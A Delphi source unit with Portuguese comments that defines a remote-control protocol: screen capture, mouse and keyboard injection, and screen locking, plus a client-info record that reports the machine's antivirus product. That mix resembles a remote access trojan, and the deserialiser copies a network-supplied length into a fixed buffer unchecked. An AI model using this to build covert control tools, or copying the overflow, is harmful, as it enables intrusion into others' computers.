unit Protocol;

interface

uses
  System.SysUtils, System.Classes;

const
  // Comandos do protocolo
  CMD_CLIENT_INFO = $01;      // Cliente envia informações
  CMD_PING = $02;             // Ping/Pong
  CMD_PONG = $03;             // Resposta ao ping
  CMD_SCREEN_START = $04;     // Iniciar captura de tela
  CMD_SCREEN_STOP = $05;      // Parar captura de tela
  CMD_SCREEN_DATA = $06;      // Dados da tela
  CMD_MOUSE_MOVE = $07;       // Mover mouse
  CMD_MOUSE_CLICK = $08;      // Click mouse
  CMD_KEYBOARD = $09;         // Tecla
  CMD_LOCK_SCREEN = $0A;      // Travar tela
  CMD_UNLOCK_SCREEN = $0B;    // Destravar tela
  CMD_DISCONNECT = $FF;       // Desconectar

type
  TPacketHeader = packed record
    Command: Byte;
    DataSize: Cardinal;
  end;

  TClientInfo = record
    ComputerName: string[255];
    IPAddress: string[15];
    MACAddress: string[17];
    AntiVirus: string[255];
    OSVersion: string[255];
  end;

  TMouseCommand = packed record
    X: Integer;
    Y: Integer;
    Button: Byte; // 0=move, 1=left, 2=right, 3=middle
  end;

  TKeyboardCommand = packed record
    VirtualKey: Word;
    KeyDown: Boolean;
  end;

function CreatePacket(Command: Byte; const Data: TBytes): TBytes;
function ParsePacket(const Buffer: TBytes; out Command: Byte; out Data: TBytes): Boolean;
function ClientInfoToBytes(const Info: TClientInfo): TBytes;
function BytesToClientInfo(const Data: TBytes): TClientInfo;

implementation

function CreatePacket(Command: Byte; const Data: TBytes): TBytes;
var
  Header: TPacketHeader;
  DataLen: Cardinal;
begin
  DataLen := Length(Data);
  Header.Command := Command;
  Header.DataSize := DataLen;

  SetLength(Result, SizeOf(TPacketHeader) + DataLen);
  Move(Header, Result[0], SizeOf(TPacketHeader));
  if DataLen > 0 then
    Move(Data[0], Result[SizeOf(TPacketHeader)], DataLen);
end;

function ParsePacket(const Buffer: TBytes; out Command: Byte; out Data: TBytes): Boolean;
var
  Header: TPacketHeader;
begin
  Result := False;
  if Length(Buffer) < SizeOf(TPacketHeader) then
    Exit;

  Move(Buffer[0], Header, SizeOf(TPacketHeader));
  Command := Header.Command;

  if Length(Buffer) < SizeOf(TPacketHeader) + Integer(Header.DataSize) then
    Exit;

  SetLength(Data, Header.DataSize);
  if Header.DataSize > 0 then
    Move(Buffer[SizeOf(TPacketHeader)], Data[0], Header.DataSize);

  Result := True;
end;

function ClientInfoToBytes(const Info: TClientInfo): TBytes;
var
  Stream: TMemoryStream;
  Len: Integer;
begin
  Stream := TMemoryStream.Create;
  try
    // ComputerName
    Len := Length(Info.ComputerName);
    Stream.Write(Len, SizeOf(Integer));
    if Len > 0 then
      Stream.Write(Info.ComputerName[1], Len);

    // IPAddress
    Len := Length(Info.IPAddress);
    Stream.Write(Len, SizeOf(Integer));
    if Len > 0 then
      Stream.Write(Info.IPAddress[1], Len);

    // MACAddress
    Len := Length(Info.MACAddress);
    Stream.Write(Len, SizeOf(Integer));
    if Len > 0 then
      Stream.Write(Info.MACAddress[1], Len);

    // AntiVirus
    Len := Length(Info.AntiVirus);
    Stream.Write(Len, SizeOf(Integer));
    if Len > 0 then
      Stream.Write(Info.AntiVirus[1], Len);

    // OSVersion
    Len := Length(Info.OSVersion);
    Stream.Write(Len, SizeOf(Integer));
    if Len > 0 then
      Stream.Write(Info.OSVersion[1], Len);

    SetLength(Result, Stream.Size);
    Stream.Position := 0;
    Stream.Read(Result[0], Stream.Size);
  finally
    Stream.Free;
  end;
end;

function BytesToClientInfo(const Data: TBytes): TClientInfo;
var
  Stream: TMemoryStream;
  Len: Integer;
  Buffer: array[0..255] of AnsiChar;
begin
  Stream := TMemoryStream.Create;
  try
    Stream.Write(Data[0], Length(Data));
    Stream.Position := 0;

    // ComputerName
    Stream.Read(Len, SizeOf(Integer));
    if Len > 0 then
    begin
      Stream.Read(Buffer[0], Len);
      Result.ComputerName := Copy(string(Buffer), 1, Len);
    end;

    // IPAddress
    Stream.Read(Len, SizeOf(Integer));
    if Len > 0 then
    begin
      Stream.Read(Buffer[0], Len);
      Result.IPAddress := Copy(string(Buffer), 1, Len);
    end;

    // MACAddress
    Stream.Read(Len, SizeOf(Integer));
    if Len > 0 then
    begin
      Stream.Read(Buffer[0], Len);
      Result.MACAddress := Copy(string(Buffer), 1, Len);
    end;

    // AntiVirus
    Stream.Read(Len, SizeOf(Integer));
    if Len > 0 then
    begin
      Stream.Read(Buffer[0], Len);
      Result.AntiVirus := Copy(string(Buffer), 1, Len);
    end;

    // OSVersion
    Stream.Read(Len, SizeOf(Integer));
    if Len > 0 then
    begin
      Stream.Read(Buffer[0], Len);
      Result.OSVersion := Copy(string(Buffer), 1, Len);
    end;
  finally
    Stream.Free;
  end;
end;

end.
